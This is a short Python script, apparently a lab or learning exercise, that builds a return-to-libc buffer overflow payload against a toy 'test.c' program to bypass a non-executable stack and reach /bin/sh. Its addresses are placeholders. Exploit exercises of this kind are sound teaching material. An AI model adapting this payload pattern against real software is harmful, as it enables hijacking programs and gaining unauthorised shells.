#!/usr/bin/python
#
# Exploit title: test.c example exploit to bypass non-executable stack
#
# Exploit author: oneforty4
#

import struct

bufsize = 260		# number of junk bytes to fill the buffer with

exploit =  'A' * bufsize			# fill string with junk
exploit += struct.pack("<I", 0xAABBCCDD)	# first return address
exploit += struct.pack("<I", 0xAABBCCDD)	# address of /bin/sh
exploit += 'B' * 4				# this is padding
exploit += struct.pack("<I", 0xAABBCCDD)	# second return address

print exploit
